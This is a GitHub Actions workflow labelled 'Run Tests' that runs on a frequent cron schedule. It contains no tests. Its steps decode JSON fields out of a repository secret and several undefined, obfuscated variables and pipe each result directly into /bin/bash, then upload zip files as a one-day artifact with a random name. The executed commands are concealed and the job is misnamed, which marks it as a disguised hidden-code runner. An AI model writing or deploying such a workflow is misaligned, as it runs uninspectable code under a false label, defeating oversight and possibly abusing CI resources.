name: Run Tests
on:
  workflow_dispatch:

  schedule:
    - cron: '36 5,11,17,23 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  scheduler:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Invoke
        env:
          opsd64: ${{ secrets.opsd64 }}
        run: |
          printf '%s' "$opsd64" | jq -r .np4 | /bin/bash
          echo $pk37 | jq -r .bmbh728 | /bin/bash
          echo $krnd8782 | jq -r .ylyb31 | /bin/bash
          printf '%s' "$lwlc30751" | jq -r .dlmu84 | /bin/bash
          printf '%s' "$k3" | jq -r .b7573 | /bin/bash

      - name: Store artifact
        uses: actions/upload-artifact@v4
        with:
          name: DpIZAAck
          path: "*.zip"
          retention-days: 1
